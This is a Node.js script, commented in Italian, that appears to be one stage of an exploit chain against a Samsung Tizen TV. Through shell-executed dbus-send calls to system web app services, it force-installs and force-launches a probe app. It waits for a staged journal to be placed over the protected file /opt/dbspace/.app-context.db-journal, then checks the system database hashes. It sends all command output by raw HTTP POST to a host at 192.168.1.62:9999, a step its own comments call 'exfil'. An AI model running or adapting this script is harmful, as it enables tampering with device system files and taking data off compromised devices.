"use strict";

/* p75: Probe12 install state + launch 19-args ESATTI + p71 flow + verify
   A. Probe12.wgt su TV: md5 (207d3f7f8fd57227ece8eccf8215ca2f)
   B. install state: /opt/usr/apps/ProbeTwelio + apps_rw completo
   C. se assente: was_install_app (11 args) -> wait 60s -> recheck
      se ancora assente: retry con install_path=/opt/usr/apps -> wait 60s
   D. launch_app EXACT 19 in-args (5s+14i) = s i s s s i i i s + 10 i (forceLaunch=1)
      self-correct: se InvalidArgs -> parse expected sig dall'errore -> retry con quel count
   E. wait 90s (p71 flow: fsTest, liveReport, journalReport, D1/D6, J1, journalVerify)
   F. verify: DST md5 (atteso 03683f81d337ce2224df6010456738e9 se J1 ok), LIVE md5,
      showing app, app dirs
   exfil /p75info
 */

var fs = null, cp = null, net = null, crypto = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
try { crypto = require('crypto'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var WGT_LOCAL = '/home/owner/share/tmp/sdk_tools/Probe12.wgt';
var WGT_MD5 = '207d3f7f8fd57227ece8eccf8215ca2f';
var APP12 = 'ProbeTwelio.Probe12';
var LITE = 'org.tizen.tv.litewebappservice.server';
var LITE_PATH = '/org/tizen/tv/litewebappservice/server';
var LITE_IFACE = 'org.tizen.tv.litewebappservice.server.interface';
var WAS = 'org.tizen.tv.webappservice.server';
var WAS_PATH = '/org/tizen/tv/webappservice/server';
var WAS_IFACE = 'org.tizen.tv.webappservice.server.interface';
var R = { ts: new Date().toISOString(), probe: 'p75', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p75info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function sleepSync(ms) {
  try { cp.execSync('sleep ' + Math.ceil(ms / 1000), { timeout: ms + 30000, maxBuffer: 4096 }); } catch (e) {}
}

function md5OfFile(p) {
  try {
    var h = crypto.createHash('md5');
    h.update(fs.readFileSync(p), 'binary');
    return h.digest('hex');
  } catch (e) { return 'ERR ' + e; }
}

function installState() {
  return run('test -d /opt/usr/apps/ProbeTwelio && echo PROBE12_DIR_OK || echo PROBE12_DIR_MISSING; echo ===APPS_RW; ls -la /opt/usr/home/owner/apps_rw/ 2>&1 | head -15; echo ===OPT_APPS; ls -la /opt/usr/apps/ 2>&1 | head -25; echo ===WGT; ls -la ' + WGT_LOCAL + ' 2>&1', 25000);
}

function wasInstall(installPath) {
  return run('dbus-send --system --print-reply --dest=' + WAS + ' --type=method_call ' + WAS_PATH + ' ' + WAS_IFACE + '.was_install_app int32:0 string:"p75" int32:0 int32:0 string:"' + APP12 + '" string:"' + WGT_LOCAL + '" string:"' + installPath + '" int32:0 int32:0 int32:0 string:"p75-install" 2>&1 | head -12', 60000);
}

/* launch con N total args (N = 5s + (N-5) i); 4 i fissi prima di "launch", forceLaunch=1 primo dopo */
function launchCall(totalArgs) {
  var rest = totalArgs - 9;
  if (rest < 1) rest = 1;
  var tail = 'int32:1';
  for (var i = 1; i < rest; i++) tail += ' int32:0';
  return run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.launch_app string:"p75" int32:0 string:"' + APP12 + '" string:"" string:"p75" int32:0 int32:0 int32:0 string:"launch" ' + tail + ' 2>&1 | head -10', 45000);
}

function expectedFromErr(s) {
  var i = s.indexOf('does not match expected type');
  if (i < 0) return null;
  var a = s.indexOf('(', i);
  var b = s.indexOf(')', a);
  if (a < 0 || b < 0) return null;
  return s.substring(a + 1, b);
}

function main() {
  /* ---------- A. WGT check ---------- */
  R.results.a_wgt = 'md5=' + md5OfFile(WGT_LOCAL) + ' expected=' + WGT_MD5;
  L('wgt ' + R.results.a_wgt);

  /* ---------- B. install state ---------- */
  R.results.b_state0 = installState();

  /* ---------- C. reinstall if needed ---------- */
  if (R.results.b_state0.indexOf('PROBE12_DIR_OK') < 0) {
    R.results.c1_install = wasInstall('');
    L('install1 sent');
    sleepSync(60000);
    R.results.c2_state1 = installState();
    if (R.results.c2_state1.indexOf('PROBE12_DIR_OK') < 0) {
      R.results.c3_install2 = wasInstall('/opt/usr/apps');
      L('install2 sent');
      sleepSync(60000);
      R.results.c4_state2 = installState();
    }
  }

  /* ---------- D. launch 19 args (self-correcting) ---------- */
  var launchOut = launchCall(19);
  R.results.d1_launch_19 = launchOut;
  L('launch19: ' + launchOut.substring(0, 300));
  if (launchOut.indexOf('InvalidArgs') >= 0) {
    var exp = expectedFromErr(launchOut);
    R.results.d2_expected = exp ? ('sig=' + exp + ' len=' + exp.length) : 'parse-fail';
    if (exp && exp.length !== 19) {
      launchOut = launchCall(exp.length);
      R.results.d3_launch_corrected = launchOut + ' (n=' + exp.length + ')';
      L('launch-corrected: ' + launchOut.substring(0, 300));
    }
  }

  /* ---------- E. wait p71 flow ---------- */
  sleepSync(90000);

  /* ---------- F. verify ---------- */
  R.results.f1_verify = run('echo ===DST; ls -la ' + DST + ' 2>&1; md5sum ' + DST + ' 2>&1; echo ===LIVE; md5sum ' + LIVE + ' 2>&1; echo ===STAGED; md5sum ' + STAGED + ' 2>&1', 25000);
  R.results.f2_showing = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.get_current_showing_app 2>&1 | head -8', 30000);
  R.results.f3_appdirs = installState();

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
